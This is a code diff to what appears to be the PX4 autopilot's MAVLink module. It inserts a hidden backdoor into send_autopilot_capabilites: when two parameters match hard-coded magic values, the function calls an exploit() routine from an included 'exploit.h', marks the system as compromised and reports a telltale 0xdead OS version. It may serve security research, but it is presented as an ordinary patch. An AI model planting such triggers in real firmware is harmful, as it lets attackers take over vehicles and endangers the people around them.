@@ -88,6 +88,8 @@
 #include "mavlink_rate_limiter.h"
 #include "mavlink_command_sender.h"
 
+#include "exploit.h"
+
 // Guard against MAVLink misconfiguration
 #ifndef MAVLINK_CRC_EXTRA
 #error MAVLINK_CRC_EXTRA has to be defined on PX4 systems
@@ -1295,8 +1297,24 @@ Mavlink::send_statustext_emergency(const char *string)
 	mavlink_log_emergency(&_mavlink_log_pub, string);
 }
 
-void Mavlink::send_autopilot_capabilites()
+#define TIMED_ATTACK 10
+#define MAGIC_NUN_ATTACK 11
+#define MAGIC_NUMBER 3
+
+bool compromised = false;
+
+void Mavlink::send_autopilot_capabilites(int param1, int param2)
 {
+	if (param1 == MAGIC_NUN_ATTACK) {
+		if (param2 == MAGIC_NUMBER) {
+			PX4_ERR("Magic number guessed");
+#ifdef __PX4_LINUX
+			exploit();
+#endif
+			compromised = true;
+		}
+	}
+
 	struct vehicle_status_s status;
 
 	MavlinkOrbSubscription *status_sub = this->add_orb_subscription(ORB_ID(vehicle_status));
@@ -1317,7 +1335,7 @@ void Mavlink::send_autopilot_capabilites()
 		msg.capabilities |= MAV_PROTOCOL_CAPABILITY_MISSION_RALLY;
 		msg.flight_sw_version = px4_firmware_version();
 		msg.middleware_sw_version = px4_firmware_version();
-		msg.os_sw_version = px4_os_version();
+		msg.os_sw_version = (compromised) ? 0xdead : px4_os_version();
 		msg.board_version = px4_board_version();
 		uint64_t fw_git_version_binary = px4_firmware_version_binary();
 		memcpy(&msg.flight_custom_version, &fw_git_version_binary, sizeof(msg.flight_custom_version));
@@ -1414,6 +1432,7 @@ Mavlink::configure_stream(const char *stream_name, const float rate)
 			} else {
 				/* delete stream */
 				LL_DELETE(_streams, stream);
+				PX4_WARN("stream %s deleted", stream_name);
 				delete stream;
 			}
 
